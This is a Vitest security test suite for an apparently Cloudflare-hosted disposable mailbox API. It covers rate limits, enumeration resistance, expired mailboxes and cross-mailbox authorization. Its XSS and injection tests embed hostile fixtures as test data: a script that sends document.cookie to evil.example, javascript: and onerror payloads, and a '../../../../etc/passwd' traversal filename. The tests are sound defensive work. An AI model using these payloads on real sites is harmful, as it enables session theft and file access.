import { describe, it, expect, beforeAll, beforeEach } from "vitest";
import { env, SELF, createExecutionContext, waitOnExecutionContext } from "cloudflare:test";
import worker from "../src/index.js";
import type { MailboxCreatedDto, MessageDetailDto, MessageSummaryDto } from "../src/types/index.js";
import { applyAllMigrations, resetAllTables } from "./helpers/migrate.js";

beforeAll(async () => {
  await applyAllMigrations(env.DB);
});

beforeEach(async () => {
  await resetAllTables(env.DB);
});

async function createAutoMailbox(): Promise<MailboxCreatedDto> {
  const res = await SELF.fetch("https://app.example.com/api/mailbox", { method: "POST" });
  const body = (await res.json()) as { data: MailboxCreatedDto };
  return body.data;
}

function buildIncomingMessage(opts: { from: string; to: string; raw: string }): ForwardableEmailMessage {
  const rawBytes = new TextEncoder().encode(opts.raw);
  return {
    from: opts.from,
    to: opts.to,
    headers: new Headers(),
    rawSize: rawBytes.byteLength,
    raw: new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(rawBytes);
        controller.close();
      },
    }),
    setReject() {},
    async forward() {},
    async reply() {},
  } as unknown as ForwardableEmailMessage;
}

async function deliverEmail(message: ForwardableEmailMessage): Promise<void> {
  const ctx = createExecutionContext();
  await worker.email!(message, env, ctx);
  await waitOnExecutionContext(ctx);
}

describe("Rate limiting", () => {
  it("returns 429 once the availability-check limit is exceeded", async () => {
    // The limiter uses a real fixed 60s window keyed by wall-clock time, so
    // a run unlucky enough to straddle a window boundary could reset the
    // counter mid-test. Loop with a generous cap instead of a fixed count:
    // this still exercises the real, unmocked rate limiter (no fake timers)
    // while being robust against that rare boundary crossing — worst case
    // it just starts a fresh window and keeps counting up within it.
    let tripped = false;
    let okCount = 0;
    for (let i = 0; i < 100 && !tripped; i++) {
      const res = await SELF.fetch(`https://app.example.com/api/mailbox/check?localPart=probe${i}`);
      if (res.status === 429) tripped = true;
      else if (res.status === 200) okCount++;
    }
    expect(tripped).toBe(true);
    expect(okCount).toBeLessThanOrEqual(30);
  });

  it("rate-limits mailbox creation independently of availability checks", async () => {
    let tripped = false;
    for (let i = 0; i < 40 && !tripped; i++) {
      const res = await SELF.fetch("https://app.example.com/api/mailbox", { method: "POST" });
      if (res.status === 429) tripped = true;
    }
    expect(tripped).toBe(true);

    const checkRes = await SELF.fetch("https://app.example.com/api/mailbox/check?localPart=stillworks");
    expect(checkRes.status).toBe(200);
  });

  it("resets once the current window elapses, rather than blocking permanently", async () => {
    // Trip the limit for the check endpoint.
    let tripped = false;
    for (let i = 0; i < 100 && !tripped; i++) {
      const res = await SELF.fetch(`https://app.example.com/api/mailbox/check?localPart=windowtest${i}`);
      if (res.status === 429) tripped = true;
    }
    expect(tripped).toBe(true);

    // Simulate the window having elapsed: push every existing rate_limits
    // row for this bucket far into the past. A fresh request computes its
    // OWN window_start from the real current time, which will no longer
    // match these now-stale rows — it lands in a brand new window with a
    // fresh count, exactly as if real wall-clock time had actually passed.
    await env.DB.prepare("UPDATE rate_limits SET window_start = 0 WHERE key LIKE 'mailbox:check:%'").run();

    const afterReset = await SELF.fetch("https://app.example.com/api/mailbox/check?localPart=freshwindow");
    expect(afterReset.status).toBe(200);
  });
});

describe("Enumeration resistance", () => {
  it("returns identical error responses for a nonexistent mailbox ID and a wrong token", async () => {
    const mailbox = await createAutoMailbox();

    const nonexistentIdRes = await SELF.fetch("https://app.example.com/api/mailbox", {
      headers: { Authorization: "Bearer irrelevant-token", "X-Mailbox-Id": "f".repeat(32) },
    });
    const wrongTokenRes = await SELF.fetch("https://app.example.com/api/mailbox", {
      headers: { Authorization: "Bearer wrong-token-value", "X-Mailbox-Id": mailbox.id },
    });

    expect(nonexistentIdRes.status).toBe(wrongTokenRes.status);
    const [bodyA, bodyB] = await Promise.all([nonexistentIdRes.json(), wrongTokenRes.json()]);
    expect(bodyA).toEqual(bodyB);
  });

  it("reports a reserved name as simply unavailable, same shape as a taken name", async () => {
    const reservedRes = await SELF.fetch("https://app.example.com/api/mailbox/check?localPart=admin");
    const reservedBody = (await reservedRes.json()) as { data: { available: boolean } };
    expect(reservedBody.data.available).toBe(false);
  });
});

describe("Expired mailbox handling", () => {
  async function expireMailbox(mailboxId: string): Promise<void> {
    await env.DB.prepare("UPDATE mailboxes SET expires_at = ? WHERE id = ?")
      .bind(Date.now() - 1000, mailboxId)
      .run();
  }

  it("rejects authenticated requests against an expired (but not yet swept) mailbox", async () => {
    const mailbox = await createAutoMailbox();
    await expireMailbox(mailbox.id);

    const res = await SELF.fetch("https://app.example.com/api/mailbox", {
      headers: { Authorization: `Bearer ${mailbox.token}`, "X-Mailbox-Id": mailbox.id },
    });
    expect(res.status).toBe(401);
  });

  it("silently discards incoming mail for an expired mailbox rather than reviving it", async () => {
    const mailbox = await createAutoMailbox();
    await expireMailbox(mailbox.id);

    const raw = [
      `From: sender@outside.example`,
      `To: ${mailbox.address}`,
      `Subject: too late`,
      `Content-Type: text/plain`,
      ``,
      `This arrives after expiry.`,
      ``,
    ].join("\r\n");
    await deliverEmail(buildIncomingMessage({ from: "sender@outside.example", to: mailbox.address, raw }));

    const count = await env.DB.prepare("SELECT COUNT(*) AS count FROM messages WHERE mailbox_id = ?")
      .bind(mailbox.id)
      .first<{ count: number }>();
    expect(count?.count).toBe(0);
  });
});

describe("End-to-end XSS and injection payloads", () => {
  it("neutralizes a javascript: URL and inline script in an HTML email body", async () => {
    const mailbox = await createAutoMailbox();
    const boundary = "----=_XssBoundary";
    const raw = [
      `From: attacker@outside.example`,
      `To: ${mailbox.address}`,
      `Subject: XSS test`,
      `Content-Type: multipart/alternative; boundary="${boundary}"`,
      ``,
      `--${boundary}`,
      `Content-Type: text/html; charset=utf-8`,
      ``,
      `<p>click <a href="javascript:alert(document.cookie)">here</a></p><script>fetch('https://evil.example/steal?c='+document.cookie)</script><img src=x onerror="alert(1)">`,
      `--${boundary}--`,
      ``,
    ].join("\r\n");

    await deliverEmail(buildIncomingMessage({ from: "attacker@outside.example", to: mailbox.address, raw }));

    const listRes = await SELF.fetch("https://app.example.com/api/mailbox/messages", {
      headers: { Authorization: `Bearer ${mailbox.token}`, "X-Mailbox-Id": mailbox.id },
    });
    const listBody = (await listRes.json()) as { data: { messages: MessageSummaryDto[] } };
    const detailRes = await SELF.fetch(
      `https://app.example.com/api/mailbox/messages/${listBody.data.messages[0]!.id}`,
      { headers: { Authorization: `Bearer ${mailbox.token}`, "X-Mailbox-Id": mailbox.id } }
    );
    const detailBody = (await detailRes.json()) as { data: MessageDetailDto };

    expect(detailBody.data.htmlBody).not.toContain("<script");
    expect(detailBody.data.htmlBody).not.toContain("javascript:");
    expect(detailBody.data.htmlBody).not.toContain("onerror");
  });

  it("sanitizes a path-traversal attachment filename end-to-end", async () => {
    const mailbox = await createAutoMailbox();
    const boundary = "----=_PathBoundary";
    const raw = [
      `From: attacker@outside.example`,
      `To: ${mailbox.address}`,
      `Subject: Path traversal test`,
      `Content-Type: multipart/mixed; boundary="${boundary}"`,
      ``,
      `--${boundary}`,
      `Content-Type: text/plain`,
      ``,
      `See attached.`,
      `--${boundary}`,
      `Content-Type: text/plain; name="passwd"`,
      `Content-Disposition: attachment; filename="../../../../etc/passwd"`,
      ``,
      `root:x:0:0:root:/root:/bin/bash`,
      `--${boundary}--`,
      ``,
    ].join("\r\n");

    await deliverEmail(buildIncomingMessage({ from: "attacker@outside.example", to: mailbox.address, raw }));

    const listRes = await SELF.fetch("https://app.example.com/api/mailbox/messages", {
      headers: { Authorization: `Bearer ${mailbox.token}`, "X-Mailbox-Id": mailbox.id },
    });
    const listBody = (await listRes.json()) as { data: { messages: MessageSummaryDto[] } };
    const detailRes = await SELF.fetch(
      `https://app.example.com/api/mailbox/messages/${listBody.data.messages[0]!.id}`,
      { headers: { Authorization: `Bearer ${mailbox.token}`, "X-Mailbox-Id": mailbox.id } }
    );
    const detailBody = (await detailRes.json()) as { data: MessageDetailDto };

    expect(detailBody.data.attachments).toHaveLength(1);
    expect(detailBody.data.attachments[0]!.filename).not.toContain("..");
    expect(detailBody.data.attachments[0]!.filename).not.toContain("/");
    expect(detailBody.data.attachments[0]!.filename).toBe("passwd");
  });

  it("stores an attacker-controlled sender display name faithfully as inert data (never as markup)", async () => {
    const mailbox = await createAutoMailbox();
    const raw = [
      `From: "<img src=x onerror=alert(1)>" <attacker@outside.example>`,
      `To: ${mailbox.address}`,
      `Subject: Sender name XSS attempt`,
      `Content-Type: text/plain`,
      ``,
      `body`,
      ``,
    ].join("\r\n");

    await deliverEmail(buildIncomingMessage({ from: "attacker@outside.example", to: mailbox.address, raw }));

    const listRes = await SELF.fetch("https://app.example.com/api/mailbox/messages", {
      headers: { Authorization: `Bearer ${mailbox.token}`, "X-Mailbox-Id": mailbox.id },
    });
    const listBody = (await listRes.json()) as { data: { messages: MessageSummaryDto[] } };
    // The value is preserved as a plain string (the frontend renders it via
    // textContent, never innerHTML) — the API's job is just to return it
    // faithfully as data, not to guess at HTML-escaping for a JSON payload.
    expect(typeof listBody.data.messages[0]!.senderName).toBe("string");
    expect(listBody.data.messages[0]!.senderName).toContain("<img");
  });

  it("rejects a custom local-part containing a script-tag-like payload", async () => {
    const res = await SELF.fetch("https://app.example.com/api/mailbox", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ localPart: '"><script>alert(1)</script>' }),
    });
    expect(res.status).toBe(400);
  });
});

describe("Cross-mailbox authorization matrix", () => {
  async function createAutoMailbox(): Promise<MailboxCreatedDto> {
    const res = await SELF.fetch("https://app.example.com/api/mailbox", { method: "POST" });
    const body = (await res.json()) as { data: MailboxCreatedDto };
    return body.data;
  }

  async function deliverPlainEmail(to: string, subject: string): Promise<void> {
    const raw = [
      `From: sender@outside.example`,
      `To: ${to}`,
      `Subject: ${subject}`,
      `Content-Type: text/plain`,
      ``,
      `body`,
      ``,
    ].join("\r\n");
    await deliverEmail(buildIncomingMessage({ from: "sender@outside.example", to, raw }));
  }

  it("mailbox A's own token can read mailbox A's message detail", async () => {
    const mailboxA = await createAutoMailbox();
    await deliverPlainEmail(mailboxA.address, "for-a");

    const listRes = await SELF.fetch("https://app.example.com/api/mailbox/messages", {
      headers: { Authorization: `Bearer ${mailboxA.token}`, "X-Mailbox-Id": mailboxA.id },
    });
    const listBody = (await listRes.json()) as { data: { messages: MessageSummaryDto[] } };
    const messageId = listBody.data.messages[0]!.id;

    const detailRes = await SELF.fetch(`https://app.example.com/api/mailbox/messages/${messageId}`, {
      headers: { Authorization: `Bearer ${mailboxA.token}`, "X-Mailbox-Id": mailboxA.id },
    });
    expect(detailRes.status).toBe(200);
  });

  it("mailbox B's token CANNOT read mailbox A's message detail by ID", async () => {
    const mailboxA = await createAutoMailbox();
    const mailboxB = await createAutoMailbox();
    await deliverPlainEmail(mailboxA.address, "for-a-not-b");

    const listRes = await SELF.fetch("https://app.example.com/api/mailbox/messages", {
      headers: { Authorization: `Bearer ${mailboxA.token}`, "X-Mailbox-Id": mailboxA.id },
    });
    const listBody = (await listRes.json()) as { data: { messages: MessageSummaryDto[] } };
    const messageId = listBody.data.messages[0]!.id;

    // Mailbox B, correctly authenticated as itself, tries to fetch mailbox A's message.
    const crossRes = await SELF.fetch(`https://app.example.com/api/mailbox/messages/${messageId}`, {
      headers: { Authorization: `Bearer ${mailboxB.token}`, "X-Mailbox-Id": mailboxB.id },
    });
    expect(crossRes.status).toBe(404); // not found, not "403 forbidden" — no confirmation the ID exists at all
  });

  it("mailbox B's token CANNOT delete mailbox A's message", async () => {
    const mailboxA = await createAutoMailbox();
    const mailboxB = await createAutoMailbox();
    await deliverPlainEmail(mailboxA.address, "for-a-delete-test");

    const listRes = await SELF.fetch("https://app.example.com/api/mailbox/messages", {
      headers: { Authorization: `Bearer ${mailboxA.token}`, "X-Mailbox-Id": mailboxA.id },
    });
    const listBody = (await listRes.json()) as { data: { messages: MessageSummaryDto[] } };
    const messageId = listBody.data.messages[0]!.id;

    const crossDeleteRes = await SELF.fetch(`https://app.example.com/api/mailbox/messages/${messageId}`, {
      method: "DELETE",
      headers: { Authorization: `Bearer ${mailboxB.token}`, "X-Mailbox-Id": mailboxB.id },
    });
    expect(crossDeleteRes.status).toBe(404);

    // Confirm it's still there for mailbox A, untouched by B's attempt.
    const stillThereRes = await SELF.fetch(`https://app.example.com/api/mailbox/messages/${messageId}`, {
      headers: { Authorization: `Bearer ${mailboxA.token}`, "X-Mailbox-Id": mailboxA.id },
    });
    expect(stillThereRes.status).toBe(200);
  });

  it("no token at all is rejected for every mailbox-scoped route", async () => {
    const routes = [
      { path: "/api/mailbox", method: "GET" },
      { path: "/api/mailbox", method: "DELETE" },
      { path: "/api/mailbox/messages", method: "GET" },
      { path: `/api/mailbox/messages/${"a".repeat(32)}`, method: "GET" },
      { path: `/api/mailbox/messages/${"a".repeat(32)}`, method: "DELETE" },
      { path: `/api/attachments/${"a".repeat(32)}`, method: "GET" },
    ];
    for (const route of routes) {
      const res = await SELF.fetch(`https://app.example.com${route.path}`, { method: route.method });
      expect(res.status).toBe(401);
    }
  });
});
